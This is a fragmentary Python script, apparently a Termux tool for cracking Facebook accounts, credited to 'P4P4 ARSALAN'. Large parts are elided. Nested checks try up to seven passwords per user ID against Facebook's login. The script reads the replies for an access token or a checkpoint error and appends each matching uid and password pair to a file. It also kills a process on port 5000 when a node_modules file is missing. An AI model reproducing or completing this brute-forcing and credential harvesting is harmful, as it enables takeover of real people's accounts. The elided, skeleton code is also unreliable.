...
if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
    ...
    os.system("fuser -k 5000/tOOOPPS &")
...
\033[1;92m Owner  : P4P4 ARSALAN (FACEBOOK ZAMA DA GHINN HAHHA)
...
def menu_select():
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\x1b[1;93m[ARSALAN-OOOPPS] "+uid+" | "+pass1)

		        OOOPPS=open("OOOPPS.txt","a")

		        OOOPPS.write(uid+" | "+pass1+"\n")
		    	...
		    	if "access_token" in d:
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\x1b[1;93m[ARSALAN-OOOPPS] "+uid+" | "+pass2)

		                OOOPPS=open("OOOPPS.txt","a")

		                OOOPPS.write(uid+" | "+pass2+"\n")
		                ...
		                if 'access_token' in d:
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\x1b[1;93m[ARSALAN-OOOPPS] "+uid+" | "+pass3)

		                        OOOPPS=open("OOOPPS.txt","a")

		                        OOOPPS.write(uid+" | "+pass3+"\n")
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\x1b[1;93m[ARSALAN-OOOPPS] "+uid+" | "+pass4)

		                                OOOPPS=open("OOOPPS.txt","a")

		                                OOOPPS.write(uid+" | "+pass4+"\n")
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\x1b[1;93m[ARSALAN-OOOPPS] "+uid+" | "+pass5)

		                                        OOOPPS=open("OOOPPS.txt","a")

		                                        OOOPPS.write(uid+" | "+pass5+"\n")
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\x1b[1;93m[ARSALAN-OOOPPS] "+uid+" | "+pass6)

		                                                OOOPPS=open("OOOPPS.txt","a")

		                                                OOOPPS.write(uid+" | "+pass6+"\n")
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\x1b[1;93m[ARSALAN-OOOPPS] "+uid+" | "+pass7)

		                                                        OOOPPS=open("OOOPPS.txt","a")

		                                                        OOOPPS.write(uid+" | "+pass7+"\n")
	...
	print ("-> Total OOOPPS/Ok : "+str(len(OOOPPSs)) + "/"+str(len(oks)))
